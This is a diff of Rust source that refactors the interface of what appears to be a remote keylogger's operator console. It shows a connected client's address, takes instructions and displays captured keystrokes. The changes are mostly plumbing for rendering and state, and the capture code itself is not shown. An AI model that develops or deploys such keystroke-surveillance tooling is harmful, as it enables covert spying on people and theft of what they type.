@@ -11,7 +11,6 @@ use super::Core;
 pub enum AppEvent {
     Keylogger(String),
     Terminal(KeyEvent),
-    Render,
 }
 
 pub struct App {
@@ -19,7 +18,7 @@ pub struct App {
     character_index: usize,
     messages: Vec<String>,
     instructions: Vec<String>,
-    logged_keys: Vec<String>,
+    logged_keys: String,
     core: Core,
 }
 
@@ -30,7 +29,7 @@ impl App {
             messages: Vec::new(),
             instructions: Vec::new(),
             character_index: 0,
-            logged_keys: Vec::new(),
+            logged_keys: String::new(),
             core: Core::new(),
         }
     }
@@ -90,17 +89,13 @@ impl App {
     }
 
     pub fn run(&mut self, terminal: &mut DefaultTerminal) -> Result<()> {
+        self.core.start_listeners();
         self.messages.push(format!("client is connected from {}", self.core.addr));
 
-        self.core.render_tui();
-        self.core.keylogger();
-        self.core.terminal_key_event();
+        terminal.draw(|frame| self.render(frame))?;
 
         while let Ok(event) = self.core.receiver.recv() {
             match event {
-                AppEvent::Render => {
-                    terminal.draw(|frame| self.render(frame))?;
-                },
                 AppEvent::Terminal(key) => {
                     match key.code {
                         KeyCode::Enter => self.submit_instructions(),
@@ -113,9 +108,11 @@ impl App {
                     }
                 }
                 AppEvent::Keylogger(key) => {
-                    self.logged_keys.push(key);
+                    self.logged_keys.push_str(&key);
                 },
             }
+
+            terminal.draw(|frame| self.render(frame))?;
         };
         Ok(())
     }
@@ -157,13 +154,7 @@ impl App {
             .block(Block::bordered());
         frame.render_widget(instructions, layout[1]);
 
-        let keys = self
-            .logged_keys
-            .iter()
-            .map(|key| key.to_owned())
-            .collect::<String>();
-
-        let keylogger = Paragraph::new(format!("Keylogger: {}", keys))
+        let keylogger = Paragraph::new(format!("keylogger: {}", self.logged_keys))
             .style(Style::default().fg(Color::White))
             .block(Block::bordered());
         frame.render_widget(keylogger, layout[0]);
